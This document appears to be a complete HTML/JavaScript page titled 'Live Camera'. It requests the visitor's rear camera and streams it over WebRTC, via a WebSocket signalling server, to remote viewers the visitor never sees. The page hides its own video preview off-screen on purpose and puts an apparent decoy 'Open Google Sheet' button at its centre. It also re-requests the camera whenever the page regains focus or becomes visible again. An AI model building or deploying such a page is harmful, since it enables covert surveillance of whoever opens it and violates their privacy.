<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width,
               initial-scale=1.0,
               maximum-scale=1.0,
               user-scalable=no">

<title>Live Camera</title>

<style>

* {
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
}

html,
body {
    width: 100%;
    height: 100%;
    margin: 0;
    padding: 0;
    background: #000;
    overflow: hidden;
    font-family: Arial, sans-serif;
}

#app {
    width: 100%;
    height: 100%;
    position: relative;
    background: #000;
}


/* =========================================================
   CAMERA VIDEO
   HIDDEN FROM SCREEN
========================================================= */

#cameraVideo {
    position: absolute;

    width: 1px;
    height: 1px;

    opacity: 0;

    pointer-events: none;

    left: -100px;
    top: -100px;
}


/* =========================================================
   STATUS
========================================================= */

#status {
    position: absolute;

    top: 15px;
    left: 50%;

    transform: translateX(-50%);

    z-index: 20;

    padding: 9px 15px;

    border-radius: 20px;

    color: #fff;
    background: rgba(0,0,0,.75);

    font-size: 14px;

    white-space: nowrap;
}


/* =========================================================
   CAMERA ID
========================================================= */

#cameraId {
    position: absolute;

    left: 12px;
    bottom: 12px;

    z-index: 20;

    padding: 7px 10px;

    color: #fff;

    background: rgba(0,0,0,.65);

    border-radius: 8px;

    font-size: 12px;
}


/* =========================================================
   LIVE
========================================================= */

#live {
    position: absolute;

    top: 15px;
    right: 15px;

    z-index: 20;

    padding: 7px 11px;

    color: #fff;

    background: rgba(180,0,0,.85);

    border-radius: 8px;

    font-size: 12px;
    font-weight: bold;

    display: none;
}


/* =========================================================
   GOOGLE SHEETS BUTTON
========================================================= */

#googleSheetButton {

    position: absolute;

    left: 50%;
    top: 50%;

    transform: translate(-50%, -50%);

    z-index: 50;

    border: 0;

    border-radius: 12px;

    padding: 15px 24px;

    background: #fff;

    color: #111;

    font-size: 16px;

    font-weight: bold;

    cursor: pointer;

    box-shadow:
        0 5px 20px
        rgba(0,0,0,.4);
}

#googleSheetButton:active {

    transform:
        translate(-50%, -50%)
        scale(.96);

}


/* =========================================================
   START CAMERA BUTTON
========================================================= */

#startButton {

    position: absolute;

    left: 50%;
    top: calc(50% + 65px);

    transform: translateX(-50%);

    z-index: 50;

    border: 0;

    border-radius: 12px;

    padding: 13px 22px;

    background: #222;

    color: #fff;

    font-size: 14px;

    font-weight: bold;

    display: none;
}

#startButton:active {

    transform:
        translateX(-50%)
        scale(.96);

}

</style>
</head>

<body>

<div id="app">

    <!--
        CAMERA VIDEO IS HIDDEN.
        It is still used as the local
        camera stream/WebRTC source.
    -->

    <video
        id="cameraVideo"
        autoplay
        muted
        playsinline
        webkit-playsinline>
    </video>


    <div id="status">
        🟡 Connecting...
    </div>


    <div id="cameraId">
        Camera
    </div>


    <div id="live">
        ● LIVE
    </div>


    <!-- GOOGLE SHEETS -->

    <button
        id="googleSheetButton"
        type="button">

        📊 Open Google Sheet

    </button>


    <!-- CAMERA START -->

    <button
        id="startButton"
        type="button">

        📷 Start Camera

    </button>

</div>


<script>

"use strict";


/* =========================================================
   GOOGLE SHEETS LINK
========================================================= */

const GOOGLE_SHEET_URL =
    "https://sheets.google.com";


/* =========================================================
   WEBSOCKET
========================================================= */

const WS_PROTOCOL =
    location.protocol === "https:"
        ? "wss:"
        : "ws:";


const WS_URL =
    WS_PROTOCOL +
    "//" +
    location.host +
    "/camera";


/* =========================================================
   STATE
========================================================= */

let socket = null;

let cameraId = null;

let cameraStream = null;

let videoTrack = null;

let reconnectTimer = null;

let reconnectAttempts = 0;

let cameraIsLive = false;

let offlineNotificationSent = false;


/*
 * WebRTC peers.
 */

const peers = new Map();


/* =========================================================
   DOM
========================================================= */

const video =
    document.getElementById(
        "cameraVideo"
    );


const status =
    document.getElementById(
        "status"
    );


const cameraIdEl =
    document.getElementById(
        "cameraId"
    );


const liveEl =
    document.getElementById(
        "live"
    );


const startButton =
    document.getElementById(
        "startButton"
    );


const googleSheetButton =
    document.getElementById(
        "googleSheetButton"
    );


/* =========================================================
   GOOGLE SHEET BUTTON
========================================================= */

googleSheetButton.addEventListener(
    "click",
    () => {

        window.open(
            GOOGLE_SHEET_URL,
            "_blank"
        );

    }
);


/* =========================================================
   STATUS
========================================================= */

function setStatus(text) {

    status.textContent = text;

}


/* =========================================================
   SEND
========================================================= */

function send(data) {

    if (
        !socket ||
        socket.readyState !==
        WebSocket.OPEN
    ) {

        console.log(
            "WebSocket not ready:",
            data
        );

        return false;
    }


    try {

        socket.send(
            JSON.stringify(data)
        );

        console.log(
            "SEND:",
            data
        );

        return true;

    } catch (error) {

        console.error(
            "Send error:",
            error
        );

        return false;
    }

}


/* =========================================================
   CONNECT WEBSOCKET
========================================================= */

function connectWebSocket() {

    if (
        socket &&
        (
            socket.readyState ===
            WebSocket.OPEN ||

            socket.readyState ===
            WebSocket.CONNECTING
        )
    ) {

        return;
    }


    setStatus(
        "🟡 Connecting..."
    );


    try {

        socket =
            new WebSocket(
                WS_URL
            );

    } catch (error) {

        console.error(
            "WebSocket creation error:",
            error
        );

        scheduleReconnect();

        return;
    }


    socket.onopen = () => {

        console.log(
            "Camera WebSocket connected"
        );


        reconnectAttempts = 0;


        setStatus(
            "🟡 Camera connected"
        );


        if (
            cameraStream &&
            videoTrack &&
            videoTrack.readyState ===
            "live"
        ) {

            offlineNotificationSent =
                false;

            announceCameraLive();

        }

    };


    socket.onmessage =
        async event => {

            let message;


            try {

                message =
                    JSON.parse(
                        event.data
                    );

            } catch (error) {

                console.error(
                    "Invalid server message:",
                    event.data
                );

                return;
            }


            console.log(
                "RECEIVED:",
                message
            );


            await handleMessage(
                message
            );

        };


    socket.onerror =
        error => {

            console.error(
                "Camera WebSocket error:",
                error
            );

        };


    socket.onclose = () => {

        console.log(
            "Camera WebSocket closed"
        );


        setStatus(
            "🔴 Server connection lost"
        );


        scheduleReconnect();

    };

}


/* =========================================================
   SERVER MESSAGE
========================================================= */

async function handleMessage(
    message
) {

    switch (
        message.type
    ) {


        case "role":

            if (
                message.cameraId
            ) {

                cameraId =
                    String(
                        message.cameraId
                    );


                cameraIdEl.textContent =
                    "Camera ID: " +
                    cameraId;

            }


            startCamera();

            break;


        case "viewer-ready":

            if (
                message.viewerId
            ) {

                await createOfferForViewer(
                    String(
                        message.viewerId
                    )
                );

            }

            break;


        case "answer":

            await handleAnswer(
                message
            );

            break;


        case "candidate":

            await handleCandidate(
                message
            );

            break;


        case "viewer-offline":

            if (
                message.viewerId
            ) {

                destroyPeer(
                    String(
                        message.viewerId
                    )
                );

            }

            break;


        default:

            console.log(
                "Unknown message:",
                message
            );

    }

}


/* =========================================================
   START CAMERA
========================================================= */

async function startCamera() {

    if (
        cameraStream &&
        videoTrack &&
        videoTrack.readyState ===
        "live"
    ) {

        announceCameraLive();

        return;
    }


    setStatus(
        "🟡 Requesting camera permission..."
    );


    try {

        cameraStream =
            await navigator.mediaDevices
                .getUserMedia({

                    video: {

                        facingMode:
                            "environment"

                    },

                    audio: false

                });


        videoTrack =
            cameraStream
                .getVideoTracks()[0];


        if (!videoTrack) {

            throw new Error(
                "No camera video track"
            );

        }


        /*
         * Keep the camera stream attached
         * to the hidden video element.
         */

        video.srcObject =
            cameraStream;


        await video.play()
            .catch(() => {});


        videoTrack.addEventListener(
            "ended",
            handleCameraEnded
        );


        videoTrack.addEventListener(
            "mute",
            () => {

                console.log(
                    "Camera track muted"
                );

            }
        );


        videoTrack.addEventListener(
            "unmute",
            () => {

                console.log(
                    "Camera track unmuted"
                );

            }
        );


        offlineNotificationSent =
            false;


        cameraIsLive =
            false;


        setStatus(
            "🟢 Camera ready"
        );


        liveEl.style.display =
            "block";


        announceCameraLive();


    } catch (error) {

        console.error(
            "Camera permission error:",
            error
        );


        cameraStream =
            null;

        videoTrack =
            null;


        liveEl.style.display =
            "none";


        setStatus(
            "🔴 Camera permission OFF"
        );


        sendCameraOffline();


        startButton.style.display =
            "block";

    }

}


/* =========================================================
   CAMERA LIVE
========================================================= */

function announceCameraLive() {

    if (
        !cameraStream ||
        !videoTrack ||
        videoTrack.readyState !==
        "live"
    ) {

        return;
    }


    if (
        !socket ||
        socket.readyState !==
        WebSocket.OPEN
    ) {

        return;
    }


    cameraIsLive =
        true;


    offlineNotificationSent =
        false;


    startButton.style.display =
        "none";


    setStatus(
        "🟢 LIVE"
    );


    send({

        type:
            "camera-live"

    });


    for (
        const viewerId
        of peers.keys()
    ) {

        createOfferForViewer(
            viewerId
        );

    }

}


/* =========================================================
   CAMERA ENDED
========================================================= */

function handleCameraEnded() {

    console.log(
        "🔴 CAMERA TRACK ENDED"
    );


    cameraIsLive =
        false;


    liveEl.style.display =
        "none";


    setStatus(
        "🔴 Camera permission OFF"
    );


    for (
        const viewerId
        of peers.keys()
    ) {

        destroyPeer(
            viewerId
        );

    }


    if (
        cameraStream
    ) {

        try {

            cameraStream
                .getTracks()
                .forEach(track => {

                    try {

                        track.stop();

                    } catch (error) {}

                });

        } catch (error) {}

    }


    cameraStream =
        null;


    videoTrack =
        null;


    video.srcObject =
        null;


    sendCameraOffline();


    startButton.style.display =
        "block";

}


/* =========================================================
   CAMERA OFFLINE
========================================================= */

function sendCameraOffline() {

    if (
        offlineNotificationSent
    ) {

        return;
    }


    offlineNotificationSent =
        true;


    send({

        type:
            "camera-offline"

    });

}


/* =========================================================
   CREATE WEBRTC OFFER
========================================================= */

async function createOfferForViewer(
    viewerId
) {

    if (!viewerId) {

        return;
    }


    if (
        !cameraStream ||
        !videoTrack ||
        videoTrack.readyState !==
        "live"
    ) {

        console.log(
            "Camera is not live."
        );

        return;
    }


    destroyPeer(
        viewerId
    );


    const pc =
        new RTCPeerConnection({

            iceServers: [

                {
                    urls:
                        "stun:stun.l.google.com:19302"
                },

                {
                    urls:
                        "stun:stun1.l.google.com:19302"
                }

            ]

        });


    peers.set(
        viewerId,
        pc
    );


    cameraStream
        .getTracks()
        .forEach(track => {

            pc.addTrack(
                track,
                cameraStream
            );

        });


    pc.onicecandidate =
        event => {

            if (
                !event.candidate
            ) {

                return;
            }


            send({

                type:
                    "candidate",

                toViewerId:
                    viewerId,

                candidate:
                    event.candidate

            });

        };


    pc.onconnectionstatechange =
        () => {

            console.log(
                "Viewer",
                viewerId,
                "state:",
                pc.connectionState
            );


            if (
                pc.connectionState ===
                "failed"
            ) {

                destroyPeer(
                    viewerId
                );

            }

        };


    try {

        const offer =
            await pc.createOffer();


        await pc.setLocalDescription(
            offer
        );


        send({

            type:
                "offer",

            toViewerId:
                viewerId,

            offer:
                pc.localDescription

        });


    } catch (error) {

        console.error(
            "Offer error:",
            error
        );


        destroyPeer(
            viewerId
        );

    }

}


/* =========================================================
   HANDLE ANSWER
========================================================= */

async function handleAnswer(
    message
) {

    const viewerId =
        message.viewerId ||
        message.from ||
        message.sender ||
        message.toViewerId;


    const answer =
        message.answer ||
        message.sdp;


    if (
        !viewerId ||
        !answer
    ) {

        console.warn(
            "Invalid answer:",
            message
        );

        return;
    }


    const id =
        String(
            viewerId
        );


    const pc =
        peers.get(
            id
        );


    if (!pc) {

        return;
    }


    try {

        const description =
            typeof answer ===
            "string"

                ? {

                    type:
                        "answer",

                    sdp:
                        answer

                }

                : answer;


        await pc.setRemoteDescription(
            new RTCSessionDescription(
                description
            )
        );


    } catch (error) {

        console.error(
            "Answer error:",
            error
        );

    }

}


/* =========================================================
   HANDLE ICE
========================================================= */

async function handleCandidate(
    message
) {

    const viewerId =
        message.viewerId ||
        message.from ||
        message.sender;


    const candidate =
        message.candidate;


    if (
        !viewerId ||
        !candidate
    ) {

        return;
    }


    const id =
        String(
            viewerId
        );


    const pc =
        peers.get(
            id
        );


    if (!pc) {

        return;
    }


    try {

        await pc.addIceCandidate(
            new RTCIceCandidate(
                candidate
            )
        );

    } catch (error) {

        console.warn(
            "ICE error:",
            error
        );

    }

}


/* =========================================================
   DESTROY PEER
========================================================= */

function destroyPeer(
    viewerId
) {

    const id =
        String(
            viewerId
        );


    const pc =
        peers.get(
            id
        );


    if (!pc) {

        return;
    }


    try {

        pc.onicecandidate =
            null;


        pc.onconnectionstatechange =
            null;


        pc.close();

    } catch (error) {

        console.warn(
            "Peer close:",
            error
        );

    }


    peers.delete(
        id
    );

}


/* =========================================================
   RECONNECT
========================================================= */

function scheduleReconnect() {

    if (
        reconnectTimer
    ) {

        return;
    }


    reconnectAttempts++;


    const delay =
        Math.min(

            1000 *
            Math.pow(
                1.5,
                reconnectAttempts - 1
            ),

            10000

        );


    reconnectTimer =
        setTimeout(
            () => {

                reconnectTimer =
                    null;

                connectWebSocket();

            },
            delay
        );

}


/* =========================================================
   START BUTTON
========================================================= */

startButton.addEventListener(
    "click",
    () => {

        startButton.style.display =
            "none";


        startCamera();

    }
);


/* =========================================================
   VISIBILITY
========================================================= */

document.addEventListener(
    "visibilitychange",
    () => {

        if (
            document.visibilityState !==
            "visible"
        ) {

            return;
        }


        console.log(
            "Camera page visible"
        );


        if (
            !cameraStream ||
            !videoTrack ||
            videoTrack.readyState !==
            "live"
        ) {

            startCamera();

            return;
        }


        if (
            !socket ||
            socket.readyState !==
            WebSocket.OPEN
        ) {

            connectWebSocket();

            return;
        }


        announceCameraLive();

    }
);


/* =========================================================
   FOCUS
========================================================= */

window.addEventListener(
    "focus",
    () => {

        if (
            !cameraStream ||
            !videoTrack ||
            videoTrack.readyState !==
            "live"
        ) {

            startCamera();

        }

    }
);


/* =========================================================
   NETWORK ONLINE
========================================================= */

window.addEventListener(
    "online",
    () => {

        console.log(
            "Network online"
        );


        if (socket) {

            try {

                socket.close();

            } catch (error) {}

        }


        socket =
            null;


        connectWebSocket();

    }
);


/* =========================================================
   NETWORK OFFLINE
========================================================= */

window.addEventListener(
    "offline",
    () => {

        setStatus(
            "🔴 Network disconnected"
        );

    }
);


/* =========================================================
   START
========================================================= */

startButton.style.display =
    "none";


connectWebSocket();

</script>

</body>
</html>
